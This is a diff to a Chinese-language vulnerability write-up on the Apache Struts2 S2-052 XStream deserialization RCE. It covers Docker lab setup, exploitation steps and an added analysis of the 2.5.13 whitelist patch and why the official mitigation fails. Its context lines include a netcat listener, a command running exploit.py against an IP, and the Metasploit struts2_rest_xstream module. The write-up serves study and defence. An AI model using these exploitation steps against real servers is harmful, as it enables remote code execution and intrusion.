@@ -14,7 +14,7 @@ Github项目地址: [Vancir/s2-052-reproducing](https://github.com/Vancir/s2-052
 
 启用Struts REST插件并使用XStream组件对XML进行反序列操作时，未对数据内容进行有效验证，可被攻击者进行远程代码执行攻击(RCE)。
 
-实际场景中存在一定局限性，需要满足一定条件，非struts本身默认开启的组件。
+实际场景中存在一定局限性，需要满足一定条件(如要求jdk版本较新)，非struts本身默认开启的组件。
 
 ### 影响版本
 
@@ -35,7 +35,7 @@ Github项目地址: [Vancir/s2-052-reproducing](https://github.com/Vancir/s2-052
 
 ``` bash
 sudo -s # docker 需要以root身份运行
-docker pull vancir/s2-052 # 从docker cloud上拉取仓库vancir/s2-052到本地
+docker pull vancir/s2-052:2.5.12 # 从docker cloud上拉取仓库vancir/s2-052(struts2版本为2.5.12)到本地
 ```
 
 * 或使用dockerfile手动生成docker镜像
@@ -45,16 +45,16 @@ docker pull vancir/s2-052 # 从docker cloud上拉取仓库vancir/s2-052到本地
 然后切换到dockerfile文件所在路径，运行以下命令
 
 ``` bash
-docker build -t="vancir/s2-052" .
+docker build -t="vancir/s2-052:2.5.12" .
 ```
 
 * 创建并运行docker容器
 
 ``` bash
-docker run --name demo -d -p 80:8080 vancir/s2-052 
+docker run --name demo -d -p 80:8080 vancir/s2-052:2.5.12 
 ```
 
-`--name`选项设置docker容器的名称为demo，`-d`选项设置容器在后台运行，`-p`选项设置容器内8080端口映射为本地的80端口，`vancir/s2-052`是我们的docker镜像
+`--name`选项设置docker容器的名称为demo，`-d`选项设置容器在后台运行，`-p`选项设置容器内8080端口映射为本地的80端口，`vancir/s2-052:2.5.12`是我们的docker镜像
 
 docker容器运行完成后，访问`http://localhost`观察到如下页面，即完成实验环境的搭建步骤。
 
@@ -102,7 +102,7 @@ nc -l -p 8001
 python exploit.py 10.30.178.227 8001
 ```
 
-## 使用Metasploit模块进行攻击
+### 使用Metasploit模块进行攻击
 
 ``` bash
 msf > use exploit/multi/http/struts2_rest_xstream
@@ -113,6 +113,8 @@ msf exploit(struts2_rest_xstream) > show options
     ...show and set options...
 msf exploit(struts2_rest_xstream) > exploit
 ```
+
+> Todo: Wireshark观察攻击过程
 
 ## 0x04 漏洞分析
 
@@ -125,7 +127,7 @@ msf exploit(struts2_rest_xstream) > exploit
 <bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="xml" class="org.apache.struts2.rest.handler.XStreamHandler" />
 ```
 
-`ContentTypeHandler`将对应类型的请求数据分配给指定的子类进行处理，针对`xml`则是指定用`XStreamHandler`进行处理。我们查看源码分析它是如何进行处理的
+`ContentTypeHandler`将对应类型的请求数据分配给指定的子类进行处理，针对`xml`则是默认指定用`XStreamHandler`进行处理，这意味着使用REST插件就会存在`XStreamHandler`的反序列化漏洞。我们查看源码分析它是如何进行处理的
 
 ``` java
 // filepath: src/plugins/rest/src/main/java/org/apache/struts2/rest/handler/XStreamHandler.java
@@ -200,13 +202,69 @@ handler.toObject(reader, target);
 
 从`Apache Struts`的一个镜像站点下载`Apache Struts 2.5.13`的源码包进行分析: [struts-2.5.13-src.zip](https://archive.apache.org/dist/struts/2.5.13/struts-2.5.13-src.zip),同时结合官方发布补丁的commit记录进行分析： [链接](https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264)
 
-> Todo: 编写补丁分析部分
 
-* 设置插件处理的数据类型限定为json(缓解无效)
+我们可以观察到,在新发布的版本2.5.13中`org.apache.struts2.rest.handler`这个包新增了几个文件: `AllowedClassNames.java`, `AllowedClasses.java`， `AbstractContentTypeHandler.java`和`XStreamPermissionProvider.java`
 
-    ```java
-    <constant name="struts.action.extension" value="xhtml,,json" />
-    ```
+
+在`XStreamHandler`类中修改了`createXStream`方法同时新加了几个方法.
+
+``` java
+protected XStream createXStream(ActionInvocation invocation) {
+    XStream stream = new XStream();
+    LOG.debug("Clears existing permissions");
+    stream.addPermission(NoTypePermission.NONE);
+
+    LOG.debug("Adds per action permissions");
+    addPerActionPermission(invocation, stream);
+
+    LOG.debug("Adds default permissions");
+    addDefaultPermissions(invocation, stream);
+    return stream;
+}
+```
+
+新添代码的主要作用是将`xml`中的数据白名单化，把`Collection`和`Map`，一些基础类，时间类放在白名单中，这样就能阻止`XStream`反序列化的过程中带入一些有害类。
+
+``` java
+private void addPerActionPermission(ActionInvocation invocation, XStream stream) {
+    Object action = invocation.getAction();
+    if (action instanceof AllowedClasses) {
+        Set<Class<?>> allowedClasses = ((AllowedClasses) action).allowedClasses();
+        stream.addPermission(new ExplicitTypePermission(allowedClasses.toArray(new Class[allowedClasses.size()])));
+    }
+    if (action instanceof AllowedClassNames) {
+        Set<String> allowedClassNames = ((AllowedClassNames) action).allowedClassNames();
+        stream.addPermission(new ExplicitTypePermission(allowedClassNames.toArray(new String[allowedClassNames.size()])));
+    }
+    if (action instanceof XStreamPermissionProvider) {
+        Collection<TypePermission> permissions = ((XStreamPermissionProvider) action).getTypePermissions();
+        for (TypePermission permission : permissions) {
+            stream.addPermission(permission);
+        }
+    }
+}
+
+protected void addDefaultPermissions(ActionInvocation invocation, XStream stream) {
+    stream.addPermission(new ExplicitTypePermission(new Class[]{invocation.getAction().getClass()}));
+    if (invocation.getAction() instanceof ModelDriven) {
+        stream.addPermission(new ExplicitTypePermission(new Class[]{((ModelDriven) invocation.getAction()).getModel().getClass()}));
+    }
+    stream.addPermission(NullPermission.NULL);
+    stream.addPermission(PrimitiveTypePermission.PRIMITIVES);
+    stream.addPermission(ArrayTypePermission.ARRAYS);
+    stream.addPermission(CollectionTypePermission.COLLECTIONS);
+    stream.addPermission(new ExplicitTypePermission(new Class[]{Date.class}));
+}
+```
+
+另外，针对官方给出的临时缓解措施 `<constant name="struts.action.extension" value="xhtml,,json" />` 这是针对action的后缀进行限定，而是否使用`XStream`进行处理则取决于`Content-Type`是否含有`xml`。如果`Content-Type`中含有`xml`，则依旧会交给`XStream`处理。因此该临时缓解措施完全无效。
+
+针对补丁后的版本，漏洞的防御过程实验。可以拉取docker仓库中的`vancir/s2-052:2.5.13`并依照之前的步骤重新操作
+
+``` bash
+sudo -s
+docker pull vancir/s2-052:2.5.13
+```
 
 ## 0x06 Struts 2过往漏洞情况
 
@@ -219,7 +277,6 @@ Apache Struts 2漏洞频发，过往有大量的该产品的漏洞预警。安�
 在新版本中增加了`XStreamPermissionProvider`，并且对原先有问题的`createXStream`进行重写，增加了校验，拒绝不安全的类执行
 
 * 升级至`Struts 2.5.13`或`Struts 2.3.34`版本
-* 在XStreamHandler中进行数据校验或检查
 * 在不使用时移除移除`Struts REST`插件
 
 
